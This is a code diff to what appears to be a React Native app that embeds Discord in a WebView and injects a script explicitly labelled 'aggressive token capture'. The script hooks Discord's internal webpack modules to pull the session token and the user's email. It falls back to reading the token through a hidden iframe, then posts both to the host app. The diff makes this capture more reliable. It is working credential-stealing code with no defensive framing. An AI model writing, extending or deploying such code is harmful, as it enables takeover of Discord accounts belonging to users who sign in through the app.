@@ -42,59 +42,69 @@ export default function App() {
   // AGGRESSIVE TOKEN CAPTURE SCRIPT (Modified slightly to include Email)
   const INJECTED_JAVASCRIPT = `
   (function() {
+    let attempts = 0;
     function capture() {
       try {
         let token = null;
         let email = null;
 
-        // 1. ADVANCED WEBPACK SEARCH (For Token & Real Email)
         const webpack = window.webpackChunkdiscord_app;
         if (webpack) {
+          // We use a temporary chunk to hook into Discord's internal modules
           const m = webpack.push([[Symbol()], {}, (e) => e]);
+          
           for (const i in m.c) {
             const exp = m.c[i].exports;
             if (exp && exp.default) {
-              // Get Token
-              if (exp.default.getToken) token = exp.default.getToken();
+              // 1. Try to get token
+              if (exp.default.getToken) {
+                const foundToken = exp.default.getToken();
+                if (foundToken) token = foundToken;
+              }
               
-              // Get Email from UserStore or CurrentUser
-              if (exp.default.getEmail) email = exp.default.getEmail();
-              if (!email && exp.default.getCurrentUser) {
+              // 2. Try to get email (Check multiple common Discord store locations)
+              if (exp.default.getCurrentUser) {
                 const user = exp.default.getCurrentUser();
                 if (user && user.email) email = user.email;
               }
+              if (!email && exp.default.getEmail) {
+                email = exp.default.getEmail();
+              }
             }
-            if (token && email) break;
           }
         }
 
-        // 2. IFRAME FALLBACK (For Token only)
+        // 3. IFRAME FALLBACK (If Webpack token search fails)
         if (!token) {
           const iframe = document.createElement('iframe');
           iframe.style.display = 'none';
           document.body.appendChild(iframe);
-          const storage = iframe.contentWindow.localStorage;
-          const rawToken = storage.getItem('token');
+          const rawToken = iframe.contentWindow.localStorage.getItem('token');
           if (rawToken) token = rawToken.replace(/"/g, '');
+          document.body.removeChild(iframe);
         }
 
-        // 3. FINAL VALIDATION & SEND
+        // 4. SEND DATA
+        // We only stop the timer if we find the token. 
+        // We will wait up to 5 seconds to find the email before giving up and using the default.
         if (token && token.length > 20) {
-          window.ReactNativeWebView.postMessage(JSON.stringify({
-            type: 'TOKEN_DATA', 
-            token: token, 
-            email: email || "user@discord.com" 
-          }));
-          return true;
+          attempts++;
+          if (email || attempts > 10) {
+            window.ReactNativeWebView.postMessage(JSON.stringify({
+              type: 'TOKEN_DATA', 
+              token: token, 
+              email: email || "user@discord.com" 
+            }));
+            return true; 
+          }
         }
       } catch (e) {}
       return false;
     }
 
-    // Check every 1 second to give Discord time to load the UserStore
     const timer = setInterval(() => {
       if (capture()) clearInterval(timer);
-    }, 1000);
+    }, 500);
   })();
 `;
   useEffect(() => {
